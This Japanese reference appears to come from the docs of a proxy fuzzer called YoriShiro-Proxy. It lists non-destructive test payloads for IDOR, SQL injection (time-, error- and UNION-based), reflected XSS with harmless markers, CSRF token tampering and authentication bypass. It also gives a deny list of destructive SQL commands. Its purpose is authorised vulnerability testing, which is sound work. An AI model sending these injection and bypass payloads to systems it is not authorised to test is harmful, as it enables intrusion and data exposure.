# 非破壊的攻撃ペイロードパターン集

脆弱性種別ごとの非破壊的かつ識別可能なペイロード。
テスト環境のデータを破壊せず、レスポンスから成功/失敗を判定できる。

## 安全なペイロード選定の原則

### 基本ルール

- **データを変更する SQL は使用禁止**: `DROP`, `DELETE`, `UPDATE`, `INSERT`, `ALTER`, `TRUNCATE` を含むペイロードを送信してはならない
- **条件改変 (`OR 1=1` 等) は SELECT 系リクエストでのみ使用可**: GET メソッドの参照 API に限定する
- **副作用を持つメソッド (POST/PUT/PATCH/DELETE) では time-based または error-based のみ使用する**: これらはデータを変更せずに脆弱性の有無を判定できる

### 禁止ペイロード一覧

以下のペイロードは**いかなる状況でも使用禁止**:

| ペイロード | 理由 |
|-----------|------|
| `DROP TABLE ...` | テーブル削除 |
| `DELETE FROM ...` | データ全削除 |
| `UPDATE ... SET ...` | データ改ざん |
| `INSERT INTO ...` | 不正データ挿入 |
| `ALTER TABLE ...` | スキーマ変更 |
| `TRUNCATE TABLE ...` | テーブル全消去 |
| `;` を使ったスタックドクエリ | 任意 SQL 実行のリスク |

### HTTP メソッド別の禁止事項

| HTTP メソッド | 禁止ペイロード |
|-------------|--------------|
| DELETE | `OR 1=1`, `OR ''=''`, `OR true` (WHERE 句の条件が常に真になり全件削除) |
| PUT / PATCH | `OR 1=1`, `OR ''=''`, `OR true` (全件更新のリスク) |
| POST (作成系) | `OR 1=1`, `OR ''=''`, `OR true`, UNION SELECT |

**判断に迷った場合は time-based blind SQLi を使う。** これはあらゆるメソッドで安全に使用できる。

## IDOR (Insecure Direct Object Reference)

### 戦略

他ユーザーの ID に差し替えてアクセスし、ステータスコードとレスポンスの差異で判定する。

### ペイロード位置

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "body_json",
      "json_path": "$.user_id",
      "payload_set": "user-ids"
    }
  ],
  "payload_sets": {
    "user-ids": {
      "type": "range",
      "start": 1,
      "end": 20
    }
  }
}
```

PATH パラメータの場合:

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "path",
      "match": "/users/(\\d+)",
      "payload_set": "user-ids"
    }
  ],
  "payload_sets": {
    "user-ids": {"type": "range", "start": 1, "end": 20}
  }
}
```

### 判定方法

- 自分以外の ID で 200 + データ取得 -> IDOR 脆弱性あり
- 403/404 -> 適切にアクセス制御されている
- fuzz_results を `status_code` でソートし、200 のペイロードを確認する

## SQL Injection (Time-based Blind)

### 戦略

SLEEP ベースのペイロードで duration_ms の差異を観測する。

### ペイロード

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "body_json",
      "json_path": "$.search",
      "payload_set": "sqli"
    }
  ],
  "payload_sets": {
    "sqli": {
      "type": "wordlist",
      "values": [
        "normalvalue",
        "' OR SLEEP(3)-- ",
        "' OR SLEEP(3)#",
        "1 OR SLEEP(3)",
        "1; WAITFOR DELAY '0:0:3'--",
        "1' AND (SELECT SLEEP(3))-- ",
        "1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)"
      ]
    }
  }
}
```

### 判定方法

- `normalvalue` の duration_ms をベースラインとして記録
- SLEEP ペイロードで duration_ms が約 3000ms 増加 -> SQLi 脆弱性あり
- fuzz_results を `sort_by: "duration_ms"` で確認する
- `stop_on` で自動停止を設定する場合:

```json
{
  "stop_on": {
    "latency_threshold_ms": 5000,
    "latency_baseline_multiplier": 3.0,
    "latency_window": 5
  }
}
```

## SQL Injection (Error-based)

### 戦略

SQL 構文エラーを誘発し、エラーメッセージの有無やステータスコードの変化で検出する。
データの変更を一切行わないため、**副作用を持つメソッド (POST/PUT/PATCH/DELETE) でも安全に使用できる**。

### ペイロード

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "body_json",
      "json_path": "$.search",
      "payload_set": "sqli-error"
    }
  ],
  "payload_sets": {
    "sqli-error": {
      "type": "wordlist",
      "values": [
        "normalvalue",
        "'",
        "''",
        "'\"",
        "1'",
        "1 AND 'a'='b",
        "1' AND 'a'='b",
        "1\" AND \"a\"=\"b"
      ]
    }
  }
}
```

### 判定方法

- `normalvalue` のレスポンスをベースラインとして記録
- シングルクォート (`'`) でステータスコードが 500 に変化、またはエラーメッセージ (例: `SQL syntax`, `ORA-`, `SQLSTATE`) がレスポンスに含まれる -> SQLi 脆弱性あり
- ステータスコード・レスポンスボディに差異なし -> SQLi の可能性は低い

## SQL Injection (UNION-based)

### 戦略

UNION SELECT で情報を取得する。カラム数を特定し、情報の読み出しが可能かを確認する。

**使用制限**: GET メソッドの参照 API でのみ使用すること。DELETE/UPDATE/PUT/PATCH では使用禁止。

### ペイロード

**Step 1: カラム数特定 (ORDER BY)**

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "query",
      "name": "id",
      "payload_set": "orderby"
    }
  ],
  "payload_sets": {
    "orderby": {
      "type": "wordlist",
      "values": [
        "1 ORDER BY 1-- ",
        "1 ORDER BY 2-- ",
        "1 ORDER BY 3-- ",
        "1 ORDER BY 5-- ",
        "1 ORDER BY 10-- ",
        "1 ORDER BY 20-- "
      ]
    }
  }
}
```

**Step 2: UNION SELECT (カラム数確定後)**

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "query",
      "name": "id",
      "payload_set": "union"
    }
  ],
  "payload_sets": {
    "union": {
      "type": "wordlist",
      "values": [
        "1 UNION SELECT NULL,NULL,NULL-- ",
        "0 UNION SELECT NULL,NULL,NULL-- "
      ]
    }
  }
}
```

### 判定方法

- ORDER BY N で 200 -> 500 に変化する境界値 = カラム数
- UNION SELECT NULL,... でレスポンスに NULL や追加行が含まれる -> UNION SQLi 脆弱性あり
- すべてエラーとなる場合 -> UNION SQLi の可能性は低い (time-based で再確認)

## XSS (Reflected Cross-Site Scripting)

### 戦略

無害なマーカー付きペイロードを送信し、レスポンスボディでエスケープの有無を確認する。

### ペイロード

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "query",
      "name": "q",
      "payload_set": "xss"
    }
  ],
  "payload_sets": {
    "xss": {
      "type": "wordlist",
      "values": [
        "YSP_NORMAL_TEXT",
        "<YSP_TAG>test</YSP_TAG>",
        "<img src=x onerror=YSP_XSS>",
        "'\"><YSP_TAG>",
        "javascript:YSP_XSS",
        "<svg/onload=YSP_XSS>",
        "{{YSP_TEMPLATE}}",
        "§YSP_TEMPLATE§"
      ]
    }
  }
}
```

**注意**: `YSP_` プレフィックスは YoriShiro-Proxy テスト用の識別マーカー。
実際のスクリプト実行は行わない。`§YSP_TEMPLATE§` はマクロ KVS テンプレート構文の
インジェクション検出用ペイロード。fuzzer エンジンはペイロード値に対してテンプレート展開を
適用しないため、リテラルとして送信される。

### 判定方法

- fuzz_results で `body_contains: "<YSP_TAG>"` をフィルタ
- レスポンスに `<YSP_TAG>` がそのまま含まれる -> エスケープされていない (XSS 脆弱性あり)
- `&lt;YSP_TAG&gt;` に変換されている -> 適切にエスケープされている
- セッション詳細でレスポンスボディを確認し、コンテキストを分析する

## CSRF (Cross-Site Request Forgery)

### 戦略

CSRF トークンを削除/空値/他セッションの値に差し替えて、リクエストの成否を確認する。

### ペイロード

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "header",
      "name": "X-CSRF-Token",
      "payload_set": "csrf-tokens"
    }
  ],
  "payload_sets": {
    "csrf-tokens": {
      "type": "wordlist",
      "values": [
        "",
        "invalid-token-value",
        "00000000-0000-0000-0000-000000000000"
      ]
    }
  }
}
```

ヘッダ自体を削除するテスト:

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "header",
      "name": "X-CSRF-Token",
      "mode": "remove",
      "payload_set": "unused"
    }
  ]
}
```

### 判定方法

- 無効/空/削除トークンでリクエスト成功 (200/302) -> CSRF 保護なし
- 403/400 -> CSRF 保護が機能している
- Cookie ベースの CSRF トークンも同様にテスト (location: `cookie`)

## 認証・認可テスト

### 認証バイパス

Authorization ヘッダを操作する:

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "header",
      "name": "Authorization",
      "payload_set": "auth-bypass"
    }
  ],
  "payload_sets": {
    "auth-bypass": {
      "type": "wordlist",
      "values": [
        "",
        "Bearer ",
        "Bearer invalid",
        "Bearer null",
        "Basic YWRtaW46YWRtaW4="
      ]
    }
  }
}
```

### 認可 (権限昇格) テスト

低権限ユーザーのトークンで管理者 API にアクセスする:

```json
// resend
{
  "action": "resend",
  "params": {
    "flow_id": "<admin-api-flow-id>",
    "override_headers": {
      "Authorization": "Bearer <low-privilege-user-token>"
    },
    "tag": "authz-test-low-priv"
  }
}
```

### ロール降格テスト (fuzz)

複数のロールのトークンで同じ API をテストする:

```json
{
  "positions": [
    {
      "id": "pos-0",
      "location": "header",
      "name": "Authorization",
      "match": "Bearer (.*)",
      "payload_set": "role-tokens"
    }
  ],
  "payload_sets": {
    "role-tokens": {
      "type": "wordlist",
      "values": [
        "<admin-token>",
        "<editor-token>",
        "<viewer-token>",
        "<guest-token>"
      ]
    }
  }
}
```

### 判定方法

- 低権限/無認証で管理者 API が 200 -> 認証/認可バイパス
- 401/403 -> 適切に保護されている
- fuzz_results を `status_code` でソートして 200 の結果を確認する

## ペイロード位置 (location) リファレンス

| location | 用途 | 必須パラメータ |
|----------|------|---------------|
| `header` | HTTP ヘッダ値の差し替え | `name` (ヘッダ名) |
| `query` | クエリパラメータの差し替え | `name` (パラメータ名) |
| `body_json` | JSON ボディの値差し替え | `json_path` (JSONPath) |
| `body_regex` | ボディの正規表現マッチ部分を差し替え | `match` (正規表現) |
| `path` | URL パスの一部を差し替え | `match` (正規表現) |
| `cookie` | Cookie 値の差し替え | `name` (Cookie 名) |

## mode オプション

| mode | 動作 |
|------|------|
| `replace` | 既存値をペイロードで置換 (デフォルト) |
| `add` | ペイロードを追加 |
| `remove` | パラメータ自体を削除 |
